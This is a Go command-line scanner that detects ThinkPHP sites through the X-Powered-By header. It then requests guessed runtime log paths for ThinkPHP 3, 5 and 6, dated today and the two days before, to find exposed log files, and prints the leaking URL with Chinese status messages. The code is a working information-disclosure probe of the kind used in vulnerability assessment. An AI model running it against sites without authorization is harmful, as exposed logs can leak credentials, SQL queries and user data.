package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

func getFormattedDate(dateObj time.Time) map[string]string {
	return map[string]string{
		"year":  fmt.Sprintf("%02d", dateObj.Year()),
		"month": fmt.Sprintf("%02d", dateObj.Month()),
		"day":   fmt.Sprintf("%02d", dateObj.Day()),
	}
}

func getTime() map[string]map[string]string {
	// 获取三天内的时间
	currentDate := time.Now()

	currentDateInfo := getFormattedDate(currentDate)

	yesterday := currentDate.AddDate(0, 0, -1)
	yesterdayDateInfo := getFormattedDate(yesterday)

	twoDaysAgo := currentDate.AddDate(0, 0, -2)
	twoDaysAgoInfo := getFormattedDate(twoDaysAgo)

	// 构建结果字典
	result := map[string]map[string]string{
		"today":        currentDateInfo,
		"yesterday":    yesterdayDateInfo,
		"two_days_ago": twoDaysAgoInfo,
	}
	return result
}

func tpCheck(url string) bool {
	res, err := http.Get(url)
	if err != nil {
		fmt.Println("Error:", err)
		return false
	}
	defer res.Body.Close()

	// 检查响应头中的X-Powered-By字段
	xPoweredByHeader := res.Header.Get("X-Powered-By")
	if strings.Contains(xPoweredByHeader, "ThinkPHP") {
		return true
	}

	return false
}

func tp3Payload() []string {
	var tp3PayloadSlice []string
	date := getTime()
	tp3LogDir := []string{
		"Runtime/Logs",
		"Runtime/Logs/Home",
		"Runtime/Logs/Common",
		"App/Runtime/Logs",
		"App/Runtime/Logs/Home",
		"Application/Runtime/Logs",
		"Application/Runtime/Logs/Admin",
		"Application/Runtime/Logs/Home",
		"Application/Runtime/Logs/App",
		"Application/Runtime/Logs/Ext",
		"Application/Runtime/Logs/Api",
		"Application/Runtime/Logs/Test",
		"Application/Runtime/Logs/Common",
		"Application/Runtime/Logs/Service",
	}
	for _, dir := range tp3LogDir {
		// Runtime/Logs/24_01_23.log
		todayPayload := dir + "/" + date["today"]["year"][2:] + "_" + date["today"]["month"] + "_" + date["today"]["day"] + ".log"
		yesterdayPayload := dir + "/" + date["yesterday"]["year"][2:] + "_" + date["yesterday"]["month"] + "_" + date["yesterday"]["day"] + ".log"
		twoDaysAgoPayload := dir + "/" + date["two_days_ago"]["year"][2:] + "_" + date["two_days_ago"]["month"] + "_" + date["two_days_ago"]["day"] + ".log"
		tp3PayloadSlice = append(tp3PayloadSlice, todayPayload)
		tp3PayloadSlice = append(tp3PayloadSlice, yesterdayPayload)
		tp3PayloadSlice = append(tp3PayloadSlice, twoDaysAgoPayload)
	}
	return tp3PayloadSlice
}

func tp5Payload() []string {
	var tp5PayloadSlice []string
	date := getTime()
	suffixs := []string{".log", "_cli.log", "_error.log", "_sql.log"}
	for _, suffix := range suffixs {
		// runtime/log/202401/23.log
		todayPayload := "runtime/log/" + date["today"]["year"] + date["today"]["month"] + "/" + date["today"]["day"] + suffix
		yesterdayPayload := "runtime/log/" + date["yesterday"]["year"] + date["yesterday"]["month"] + "/" + date["yesterday"]["day"] + suffix
		twoDaysAgoPayload := "runtime/log/" + date["two_days_ago"]["year"] + date["two_days_ago"]["month"] + "/" + date["two_days_ago"]["day"] + suffix
		tp5PayloadSlice = append(tp5PayloadSlice, todayPayload)
		tp5PayloadSlice = append(tp5PayloadSlice, yesterdayPayload)
		tp5PayloadSlice = append(tp5PayloadSlice, twoDaysAgoPayload)
	}
	return tp5PayloadSlice
}

func tp6Payload() []string {
	var tp6PayloadSlice []string
	date := getTime()
	tp6LogDir := []string{"runtime/log/Home", "runtime/log/Common", "runtime/log/Admin"}
	for _, dir := range tp6LogDir {
		// runtime/log/Home/202401/23.log
		todayPayload := dir + "/" + date["today"]["year"] + date["today"]["month"] + "/" + date["today"]["day"] + ".log"
		yesterdayPayload := dir + "/" + date["yesterday"]["year"] + date["yesterday"]["month"] + "/" + date["yesterday"]["day"] + ".log"
		twoDaysAgoPayload := dir + "/" + date["two_days_ago"]["year"] + date["two_days_ago"]["month"] + "/" + date["two_days_ago"]["day"] + ".log"
		tp6PayloadSlice = append(tp6PayloadSlice, todayPayload)
		tp6PayloadSlice = append(tp6PayloadSlice, yesterdayPayload)
		tp6PayloadSlice = append(tp6PayloadSlice, twoDaysAgoPayload)
	}
	return tp6PayloadSlice
}

func sendPayload(target string, tpPayload []string) string {
	for _, tpPath := range tpPayload {
		url := target + "/" + tpPath
		fmt.Println("[INFO]: ", url)

		res, err := http.Get(url)
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}

		body, err := ioutil.ReadAll(res.Body)
		res.Body.Close()

		if err != nil {
			fmt.Println("Error reading response body:", err)
			continue
		}

		if strings.Contains(string(body), "INFO") &&
			strings.Contains(string(body), "--START--") &&
			strings.Contains(string(body), "app_init") &&
			res.StatusCode == 200 {
			return url
		}
	}
	return ""
}

func main() {
	urlFlag := flag.String("u", "", "Specify the URL")
	flag.Parse()
	url := *urlFlag
	if url == "" {
		fmt.Println("Error: Please specify a URL using the -u flag.")
		flag.Usage()
		os.Exit(1)
	}
	isTp := tpCheck(url)
	if isTp {
		//fmt.Println("Start Scan")
		tp3Path := tp3Payload()
		tp5Path := tp5Payload()
		tp6Path := tp6Payload()
		path := append(append(tp3Path, tp5Path...), tp6Path...)
		logUrl := sendPayload(url, path)
		if len(logUrl) > 0 {
			fmt.Println("[ThinkPHP 日志泄露]:", logUrl)
		} else {
			fmt.Println("未发现日志泄露")
		}

	} else {
		fmt.Println("非 ThinkPHP 框架")
		return
	}
}
